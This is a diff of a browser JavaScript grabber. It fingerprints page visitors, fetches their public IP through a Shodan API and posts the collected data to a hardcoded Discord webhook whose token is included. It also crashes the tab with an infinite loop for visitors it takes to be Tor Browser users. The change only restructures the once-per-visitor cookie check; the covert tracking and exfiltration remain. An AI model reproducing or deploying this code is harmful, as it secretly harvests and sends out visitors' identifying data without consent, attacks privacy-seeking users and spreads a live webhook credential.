@@ -1,9 +1,3 @@
-// Check if the user was logged before
-if (document.cookie.split(';').some((item) => item.trim().startsWith('loggedBefore='))) {
-  return;
-}
-document.cookie = "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
-
 // Also check if the user uses TorBrowser, if they use it, crash the tab
 if (new Date().getTimezoneOffset() === 0) {
   // Remove DOM
@@ -11,9 +5,6 @@ if (new Date().getTimezoneOffset() === 0) {
   // Infinite loop
   while (true) { }
 }
-
-const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
 
 function getUserInfo() {
   const canvas = document.createElement("canvas");
@@ -109,29 +100,36 @@ function getUserInfo() {
   };
 }
 
-// Fetch the user's IP
-fetch(SHODAN_IP_API_URL)
-  .then((response) => response.text())
-  .then((data) => {
-    const IP = data
+// Check if the user was logged before
+if (document.cookie.split(';').some((item) => item.trim().startsWith('loggedBefore='))) {
+} else {
+  const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
 
-    const userInfo = getUserInfo();
+  // Fetch the user's IP
+  fetch(SHODAN_IP_API_URL)
+    .then((response) => response.text())
+    .then((data) => {
+      const IP = data
 
-    let userInfoText = `User Information for IP: ${IP}\n\n`;
-    for (let key in userInfo) {
-      userInfoText += `${key}: ${userInfo[key] || "N/A"}\n`;
-    }
+      const userInfo = getUserInfo();
 
-    const payload = {
-      content: userInfoText,
-    };
+      let userInfoText = `User Information for IP: ${IP}\n\n`;
+      for (let key in userInfo) {
+        userInfoText += `${key}: ${userInfo[key] || "N/A"}\n`;
+      }
 
-    // Send the IP to the Discord webhook
-    fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(payload),
+      const payload = {
+        content: userInfoText,
+      };
+
+      // Send the IP to the Discord webhook
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      });
     });
-  });
+  }
